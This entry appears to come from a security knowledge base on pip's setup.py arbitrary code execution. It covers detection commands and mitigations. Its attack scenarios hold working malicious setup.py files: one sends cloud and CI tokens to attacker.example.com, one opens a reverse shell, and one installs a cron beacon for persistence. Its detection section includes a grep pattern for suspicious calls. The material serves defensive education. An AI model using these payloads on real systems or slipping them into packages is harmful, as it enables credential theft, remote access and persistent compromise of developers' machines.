---
name: "setup.py Arbitrary Code Execution"
packageManager: "pip"
slug: "pip-setup-py-execution"
category: "Code Execution"
severity: "critical"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "When pip installs or builds a package through a legacy setuptools path, it may execute the package's setup.py file using the installing user's privileges. This allows an attacker to embed arbitrary Python code in setup.py that runs during build or installation, with no sandboxing beyond whatever isolation the user provides. The executed code has access to the filesystem, environment variables, network, and any resources available to the user running pip. This remains a fundamental attack vector for legacy source-distribution workflows in the Python packaging ecosystem."
descriptionCitations: [1, 2, 3, 4, 5, 6]
prerequisites:
  - "Victim installs a malicious package via pip (either from PyPI or a direct source)"
  - "pip is configured to build packages from source (default behavior for packages without wheels)"
  - "No network egress filtering or endpoint detection in place"
prerequisitesCitations: [1, 2, 3, 4, 5, 6]
attackScenarios:
  - title: "Environment Variable Exfiltration via setup.py"
    description: "An attacker publishes a package with a setup.py that collects sensitive environment variables (API keys, cloud credentials, CI/CD tokens) and exfiltrates them to an attacker-controlled server during installation."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - label: "Malicious setup.py that exfiltrates environment variables"
        code: |
          # setup.py
          import os
          import json
          import urllib.request

          # Collect sensitive environment variables
          sensitive_vars = {}
          targets = [
              "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
              "GITHUB_TOKEN", "GITLAB_TOKEN", "NPM_TOKEN",
              "DATABASE_URL", "SECRET_KEY", "API_KEY",
              "CI", "JENKINS_URL", "TRAVIS", "CIRCLECI",
          ]
          for var in targets:
              val = os.environ.get(var)
              if val:
                  sensitive_vars[var] = val

          # Exfiltrate via HTTP POST
          data = json.dumps({
              "hostname": os.uname().nodename if hasattr(os, "uname") else os.environ.get("COMPUTERNAME", "unknown"),
              "user": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
              "cwd": os.getcwd(),
              "env": sensitive_vars,
          }).encode()

          try:
              req = urllib.request.Request(
                  "https://attacker.example.com/collect",
                  data=data,
                  headers={"Content-Type": "application/json"},
              )
              urllib.request.urlopen(req, timeout=5)
          except Exception:
              pass

          # Proceed with normal setup so the install appears to succeed
          from setuptools import setup
          setup(
              name="legitimate-looking-package",
              version="1.0.0",
              description="A helpful utility library",
              py_modules=["legitimate_module"],
          )
        language: "python"
  - title: "Reverse Shell via setup.py"
    description: "An attacker embeds a reverse shell payload in setup.py that connects back to an attacker-controlled host, providing interactive shell access to the victim's machine during package installation. Note: this reverse shell example uses os.dup2() and /bin/sh, which are Linux/macOS specific and will not work on Windows."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - label: "setup.py with embedded reverse shell"
        code: |
          # setup.py
          import os
          import socket
          import subprocess
          import threading

          def reverse_shell():
              try:
                  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  s.connect(("attacker.example.com", 4444))
                  os.dup2(s.fileno(), 0)
                  os.dup2(s.fileno(), 1)
                  os.dup2(s.fileno(), 2)
                  subprocess.call(["/bin/sh", "-i"])
              except Exception:
                  pass

          # Run in background thread so installation continues
          t = threading.Thread(target=reverse_shell, daemon=True)
          t.start()

          from setuptools import setup
          setup(
              name="helpful-utils",
              version="2.1.0",
          )
        language: "python"
  - title: "Overriding the install class for persistent backdoor"
    description: "The attacker overrides the setuptools install command class to inject a backdoor that persists on the system after installation completes, such as writing a cron job or scheduled task."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - label: "setup.py with install class override deploying persistence"
        code: |
          # setup.py
          from setuptools import setup
          from setuptools.command.install import install
          import os
          import platform

          class MaliciousInstall(install):
              def run(self):
                  # Deploy persistence mechanism
                  if platform.system() == "Linux":
                      cron_entry = "* * * * * curl https://attacker.example.com/beacon?h=$(hostname)\n"
                      cron_file = os.path.expanduser("~/.cron_update")
                      with open(cron_file, "w") as f:
                          f.write(cron_entry)
                      os.system(f"crontab {cron_file}")
                      os.remove(cron_file)

                  # Run normal install so nothing looks wrong
                  install.run(self)

          setup(
              name="data-helpers",
              version="1.0.0",
              cmdclass={"install": MaliciousInstall},
          )
        language: "python"
detection:
  - title: "Inspect artifacts without invoking a source-build backend"
    description: "`pip download` can invoke build-backend hooks when it prepares metadata for a source distribution. Restrict pip downloads to wheels when you need a non-building fetch path. For a source distribution, obtain the exact archive URL and hash from the package index, download it with a generic HTTP client, and inspect it in an isolated environment."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - code: |
          # Download a wheel without invoking a source-build backend
          PACKAGE=requests
          VERSION=2.32.3
          mkdir -p /tmp/inspect/wheel /tmp/inspect/sdist
          pip download --no-deps --only-binary :all: "$PACKAGE==$VERSION" -d /tmp/inspect/wheel

          # Fetch the exact sdist URL from PyPI with a generic HTTP client.
          METADATA=$(curl -fsSL "https://pypi.org/pypi/$PACKAGE/$VERSION/json")
          SDIST_URL=$(printf '%s' "$METADATA" | jq -r '.urls[] | select(.packagetype == "sdist") | .url')
          EXPECTED_SHA256=$(printf '%s' "$METADATA" | jq -r '.urls[] | select(.packagetype == "sdist") | .digests.sha256')
          curl -fsSLo /tmp/inspect/sdist/package.tar.gz "$SDIST_URL"
          python3 - "$EXPECTED_SHA256" /tmp/inspect/sdist/package.tar.gz <<'PY'
          import hashlib, pathlib, sys
          actual = hashlib.sha256(pathlib.Path(sys.argv[2]).read_bytes()).hexdigest()
          if actual != sys.argv[1]:
              raise SystemExit(f"sha256 mismatch: {actual}")
          PY
          tar xzf /tmp/inspect/sdist/package.tar.gz -C /tmp/inspect/sdist
          cat /tmp/inspect/sdist/*/setup.py

          # Search for suspicious patterns
          grep -rn "os.system\|subprocess\|urllib\|socket\|exec(\|eval(" /tmp/inspect/sdist/*/setup.py
        language: "bash"
  - title: "Prefer pre-built wheels and inspect build backends for source installs"
    description: "Installing a pre-built wheel avoids setup.py execution entirely. For source installs, pyproject.toml changes the build interface but does not remove arbitrary code execution risk: pip still creates an isolated build environment and invokes the declared build backend and its hooks, which may execute attacker-controlled code or pull attacker-controlled build dependencies."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - code: |
          # Install only pre-built wheels, never source distributions
          PACKAGE=requests
          VERSION=2.32.3
          pip install --only-binary :all: "$PACKAGE==$VERSION"

          # Check whether a package is available as a wheel
          pip download --no-deps --only-binary :all: "$PACKAGE==$VERSION" 2>&1 || echo "No compatible wheel available - source build required"

          # If a source build is required, retrieve the sdist without invoking
          # pip, then inspect pyproject.toml and its declared build backend.
        language: "bash"
  - title: "Monitor network activity during pip install"
    description: "Use network monitoring tools to detect unexpected outbound connections during package installation, which may indicate data exfiltration or C2 communication."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - code: |
          # Linux: monitor network connections during install
          PACKAGE=requests
          VERSION=2.32.3
          strace -e trace=network -f pip install "$PACKAGE==$VERSION" 2>&1 | grep connect

          # macOS: use dtrace or nettop
          sudo dtrace -n 'syscall::connect:entry /execname == "python3"/ { trace(arg0); }' &
          pip install "$PACKAGE==$VERSION"
        language: "bash"
mitigation:
  - "Use --only-binary :all: flag with pip to install pre-built wheels and avoid executing setup.py"
  - "Treat PEP 517/518 builds as a different execution path, not a safe one; review build backends and build dependencies before installing from source"
  - "Run pip install in isolated environments (containers, VMs, or sandboxed CI/CD runners)"
  - "Implement network egress filtering to block unexpected outbound connections during builds"
  - "Use pip's --require-hashes flag to verify package integrity against known-good hashes"
  - "Audit new and updated dependencies before installation using tools like pip-audit or safety"
  - "Use a private package index with curated and vetted packages"
mitigationCitations: [1, 2, 3, 4, 5, 6]
references:
  - title: "Python Packaging User Guide - setup.py"
    url: "https://packaging.python.org/en/latest/guides/distributing-packages-using-setuptools/"
  - title: "PEP 517 - A build-system independent format for source trees"
    url: "https://peps.python.org/pep-0517/"
  - title: "PyPI Under Attack - Project Creation and User Registration Suspended"
    url: "https://checkmarx.com/blog/pypi-is-under-attack-project-creation-and-user-registration-suspended/"
  - title: "pip documentation - Installation"
    url: "https://pip.pypa.io/en/stable/cli/pip_install/"
  - title: "pip documentation - Download"
    url: "https://pip.pypa.io/en/stable/cli/pip_download/"
  - title: "pip Build System Interface"
    url: "https://pip.pypa.io/en/stable/reference/build-system/index.html"
historicalNotes:
  - date: "30 April, 2026"
    note: >-
      Updated the description and detection guidance to distinguish legacy
      setup.py execution from modern PEP 517/518 source-build behavior, and
      clarified that pyproject.toml does not by itself eliminate arbitrary
      build-time code execution. Sources:
      <a href="https://pip.pypa.io/en/stable/reference/build-system/" target="_blank" rel="noopener">pip Build System Interface</a>.
created: 2026-04-02
updated: 2026-10-14
---
